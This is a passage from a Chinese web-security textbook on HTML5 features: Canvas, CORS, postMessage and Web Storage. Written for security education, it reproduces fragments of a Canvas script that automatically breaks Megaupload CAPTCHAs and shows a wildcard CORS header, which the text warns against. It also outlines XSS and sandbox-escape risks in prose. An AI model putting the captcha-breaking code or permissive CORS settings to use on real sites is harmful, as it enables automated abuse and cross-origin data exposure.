这个标签需要开发者手动添加到页面的标签中，对于有需求的标签可以选择使用noreferrer。



<hr />
### 6.1.4 Canvas的妙用



Canvas的妙用

Canvas可以说是HTML 5中最大的创新之一。不同于<img>标签只是远程加载一个图片，<canvas>标签让JavaScript可以在页面中直接操作图片对象，也可以直接操作像素，构造出图片区域。Canvas的出现极大地挑战了传统富客户端插件的地位，开发者甚至可以用Canvas在浏览器上写一个小游戏。
下面是一个简单的Canvas的用例。

```html
<!DOCTYPE HTML>
<html>
<body>

  <canvas id="myCanvas" width="200" height="100" style="border:1px solid #c3c3c3;">
    Your browser does not support the canvas element.
  </canvas>

  <script type="text/javascript">

  var c=document.getElementById("myCanvas");
  var cxt=c.getContext("2d");
  cxt.fillStyle="#FF0000";
  cxt.fillRect(0,0,150,75);

  </script>

</body>
</html>
```

在支持Canvas的浏览器上，将描绘出一个图片。



在以下浏览器中，开始支持<canvas>标签。


```
IE 7.0+
Firefox 3.0+
Safari 3.0+
Chrome 3.0+
Opera 10.0+
iPhone 1.0+
Android 1.0+
```

Dive Into HTML5很好地介绍了Canvas及其他HTML 5的特性。

Canvas提供的强大功能，甚至可以用来破解验证码。Shaun Friedle写了一个GreaseMonkey的脚本，通过JavaScript操作Canvas中的每个像素点，成功地自动化识别了Megaupload提供的验证码。
Megaupload验证码
其大致过程如下。
首先，将图片导入Canvas，并进行转换。

```
function convert_grey(image_data){
  for (var x = 0; x < image_data.width; x++){
    for (var y = 0; y < image_data.height; y++){
      var i = x*4+y*4*image_data.width;
      var luma = Math.floor(image_data.data[i] * 299/1000 +
        image_data.data[i+1] * 587/1000 +
        image_data.data[i+2] * 114/1000);
      image_data.data[i] = luma;
      image_data.data[i+1] = luma;
      image_data.data[i+2] = luma;
      image_data.data[i+3] = 255;
    }
  }
}
分割不同字符，此处很简单，因为三个字符都使用了不同颜色。
filter(image_data[0], 105);
filter(image_data[1], 120);
filter(image_data[2], 135);

function filter(image_data, colour){
  for (var x = 0; x < image_data.width; x++){
    for (var y = 0; y < image_data.height; y++){
      var i = x*4+y*4*image_data.width;
      // Turn all the pixels of the certain colour to white
      if (image_data.data[i] == colour) {
        image_data.data[i] = 255;
        image_data.data[i+1] = 255;
        image_data.data[i+2] = 255;

      // Everything else to black
      } else {
        image_data.data[i] = 0;
        image_data.data[i+1] = 0;
        image_data.data[i+2] = 0;
      }
    }
  }
}

```

将字符从背景中分离出来，判断背景颜色即可。

```
var i = x*4+y*4*image_data.width;
var above = x*4+(y-1)*4*image_data.width;
var below = x*4+(y+1)*4*image_data.width;
if (image_data.data[i] == 255 &&
    image_data.data[above] == 0 &&
    image_data.data[below] == 0)  {
  image_data.data[i] = 0;
  image_data.data[i+1] = 0;
  image_data.data[i+2] = 0;
}
再将结果重新绘制。
cropped_canvas.getContext("2d").fillRect(0, 0, 20, 25);
var edges = find_edges(image_data[i]);
cropped_canvas.getContext("2d").drawImage(canvas, edges[0], edges[1],
  edges[2]-edges[0], edges[3]-edges[1], 0, 0,
  edges[2]-edges[0], edges[3]-edges[1]);
image_data[i] = cropped_canvas.getContext("2d").getImageData(0, 0,
  cropped_canvas.width, cropped_canvas.height);

```

完整的实现可以参考前文注释中提到的UserScripts代码。
在此基础上，作者甚至能够破解一些更为复杂的验证码，比如：
破解验证码
通过Canvas自动破解验证码，最大的好处是可以在浏览器环境中实现在线破解，大大降低了攻击的门槛。HTML 5使得过去难以做到的事情，变为可能。


<hr />
### 6.2.1 Cross-Origin Resource Sharing



浏览器实现的同源策略（Same Origin Policy）限制了脚本的跨域请求。但互联网的发展趋势是越来越开放的，因此跨域访问的需求也变得越来越迫切。同源策略给Web开发者带来了很多困扰，他们不得不想方设法地实现一些“合法”的跨域技术，由此诞生了jsonp、iframe跨域等技巧。
W3C委员会决定制定一个新的标准来解决日益迫切的跨域访问问题。这个新的标准叙述如下。
假设从http://www.a.com/test.html发起一个跨域的XMLHttpRequest请求，请求的地址为：http://www.b.com/test.php。

```
<script>
   var client = new XMLHttpRequest();
   client.open("GET", "http://www.b.com/test.php");
   client.onreadystatechange = function() { }
   client.send(null);
</script>
```

如果是在IE 8中，则需要使用XDomainRequest来实现跨域请求。
var request = new XDomainRequest();
request.open("GET", xdomainurl);
request.send();如果服务器www.b.com返回一个HTTP Header： www.b.com
Access-Control-Allow-Origin: http://www.a.com
代码如下：


```

<?php
header("Access-Control-Allow-Origin: *");
  ?>
Cross Domain Request Test!


```

那么这个来自http://www.a.com/test.html的跨域请求就会被通过。
在这个过程中，http://www.a.com/test.html发起的请求还必须带上一个`Origin Header：Origin: http://www.a.com`



在Firefox上，可以抓包分析这个过程。


```
GET http://www.b.com/test.php HTTP/1.1
Host: www.b.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1b2) Gecko/20081201
Firefox/3.1b2 Paros/3.2.13
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.5
Accept-Charset: gb2312,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
Referer: http://www.a.com/test.html
Origin: http://www.a.com
Cache-Control: max-age=0


HTTP/1.1 200 OK
Date: Thu, 15 Jan 2009 06:28:54 GMT
Server: Apache/2.0.63 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Access-Control-Allow-Origin: *
Content-Length: 28
Content-Type: text/html

Cross Domain Request Test!

```




Origin Header用于标记HTTP发起的“源”，服务器端通过识别浏览器自动带上的这个Origin Header，来判断浏览器的请求是否来自一个合法的“源”。Origin Header可以用于防范CSRF，它不像Referer那么容易被伪造或清空。



在上面的例子中，服务器端返回：


```
Access-Control-Allow-Origin: *
```


从而允许客户端的跨域请求通过。在这里使用了通配符``*``，这是极其危险的，它将允许来自任意域的跨域请求访问成功。这就好像Flash策略中的`allow-access-from: *`一样，等于没有做任何安全限制。
对于这个跨域访问的标准，还有许多HTTP Header可以用于进行更精确的控制：


```
4 Syntax
4.1 Access-Control-Allow-Origin HTTP Response Header
4.2 Access-Control-Max-Age HTTP Response Header
4.3 Access-Control-Allow-Credentials HTTP Response Header
4.4 Access-Control-Allow-Methods HTTP Response Header
4.5 Access-Control-Allow-Headers HTTP Response Header
4.6 Origin HTTP Request Header
4.7 Access-Control-Request-Method HTTP Request Header
4.8 Access-Control-Request-Hea

```

<hr />
### 6.2.2 postMessage——跨窗口传递消息


<hr />
postMessage——跨窗口传递消息



在“跨站脚本攻击”一章中，曾经提到利用window.name来跨窗口、跨域传递信息。实际上，window这个对象几乎是不受同源策略限制的，很多脚本攻击都巧妙地利用了window对象的这一特点。
在HTML 5中，为了丰富Web开发者的能力，制定了一个新的API：postMessage。在Firefox 3、IE 8、Opera 9等浏览器中，都已经开始支持这个API。



postMessage允许每一个window（包括当前窗口、弹出窗口、iframes等）对象往其他的窗口发送文本消息，从而实现跨窗口的消息传递。这个功能是不受同源策略限制的。



发送窗口：


```html
<iframe src="http://dev.jquery.com/~john/message/" id="iframe"></iframe>
<form id="form">
  <input type="text" id="msg" value="Message to send"/>
  <input type="submit"/>
</form>
<script>
window.onload = function(){
  var win = document.getElementById("iframe").contentWindow;
  document.getElementById("form").onsubmit = function(e){
    win.postMessage( document.getElementById("msg").value );
    e.preventDefault();
  };
};
</script>
接收窗口：
<b>This iframe is located on dev.jquery.com</b>
<div id="test">Send me a message!</div>
<script>
document.addEventListener("message", function(e){
  document.getElementById("test").textContent =
  e.domain + " said: " + e.data;
}, false);
</script>

```



在这个例子中，发送窗口负责发送消息；而在接收窗口中，需要绑定一个message事件，监听其他窗口发来的消息。这是两个窗口之间的一个“约定”，如果没有监听这个事件，则无法接收到消息。
在使用postMessage()时，有两个安全问题需要注意。

（1）在必要时，可以在接收窗口验证 Domain，甚至验证URL，以防止来自非法页面的消息。这实际上是在代码中实现一次同源策略的验证过程。
（2）在本例中，接收的消息写入textContent，但在实际应用中，如果将消息写入innerHTML，甚至直接写入script中，则可能会导致DOM based XSS的产生。根据“Secure By Default”原则，在接收窗口不应该信任接收到的消息，而需要对消息进行安全检查。

使用postMessage，也会使XSS Payload变得更加的灵活。Gareth Heyes曾经实现过一个JavaScript运行环境的sandbox，其原理是创建一个iframe，将JavaScript限制于其中执行。但笔者经过研究发现，利用postMessage() 给父窗口发送消息，可以突破此sandbox。类似的问题可能还会存在于其他应用中。



<hr />
### 6.2.3 Web Storage



在Web Storage出现之前，Gmail的离线浏览功能是通过Google Gears实现的。但随着Google Gears的夭折，Gmail转投Web Storage的怀抱。目前Google众多的产品线比如Gmail、Google Docs等所使用的离线浏览功能，都使用了Web Storage。



过去在浏览器里能够存储信息的方法有以下几种：


```
Cookie
Flash Shared Object
IE UserData

```



其中，Cookie主要用于保存登录凭证和少量信息，其最大长度的限制决定了不可能在Cookie中存储太多信息。而Flash Shared Object和IE UserData则是Adobe与微软自己的功能，并未成为一个通用化的标准。因此W3C委员会希望能在客户端有一个较为强大和方便的本地存储功能，这就是Web Storage。



`Web Storage`分为`Session Storage` 和 Local Storage。Session Storage关闭浏览器就会失效，而Local Storage则会一直存在。Web Storage就像一个非关系型数据库，由Key-Value对组成，可以通过JavaScript对其进行操作。目前Firefox 3和IE 8都实现了Web Storage。使用方法如下：
设置一个值：`window.sessionStorage.setItem(key, value)``;
读取一个值：`window.sessionStorage.getItem(key)``;
此外，Firefox还单独实现了一个globalStorage，它是基于SQLite实现的。
window.globalStorage.namedItem(domain).setItem(key, value);
下面这个例子展示了Web Storage的使用。


```html
<div id="sessionStorage_show">
sessionStorage Value:
</div>
<br>
<div id="localStorage_show">
localStorage Value:
</div>
<input id="set" type="button" value="check" onclick="set();">
<script>
function set(){
  window.sessionStorage.setItem("test", "this is sessionStorage");
  if (window.globalStorage){
    window.globalStorage.namedItem("a.com").setItem("test", "this is LocalStorage");
    }else{
      window.localStorage.setItem("test", "this is LocalStorage");
    }
    document.getElementById("sessionStorage_show").innerHTML +=
    window.sessionStorage.getItem("test");
    if (window.globalStorage){
      document.getElementById("localStorage_show").innerHTML +=
      window.globalStorage.namedItem("a.com").getItem("test");
      }else{
        document.getElementById("localStorage_show").innerHTML +=
        window.localStorage.getItem("test");
      }
    }
    set();
    </script>

```



Web Storage也受到同源策略的约束，每个域所拥有的信息只会保存在自己的域下



Web Storage让Web开发更加的灵活多变，它的强大功能也为XSS Payload大开方便之门。攻击者有可能将恶意代码保存在Web Storage中，从而实现跨页面攻击。
当Web Storage中保存有敏感信息时，也可能会成为攻击的目标，而XSS攻击可以完成这一过程。
可以预见，Web Storage会被越来越多的开发者所接受，与此同时，也将带来越来越多的安全挑战。

<hr />
